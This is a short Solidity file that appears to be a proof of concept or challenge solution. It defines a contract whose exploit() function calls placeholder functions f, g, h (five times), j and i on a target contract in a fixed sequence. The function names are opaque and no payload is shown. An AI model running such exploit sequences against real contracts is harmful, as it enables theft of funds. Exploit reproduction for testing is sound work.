interface ICsma {
    function f() external;
    function g() external;
    function h() external;
    function j() external;
    function i() external view;
}

contract ReproduceCsma {
    ICsma public target;

    constructor(address _target) {
        target = ICsma(_target);
    }

    function exploit() public {
        target.f();
        target.g();
        target.h();
        target.h();
        target.h();
        target.h();
        target.h();
        target.j();
        target.i();
    }
}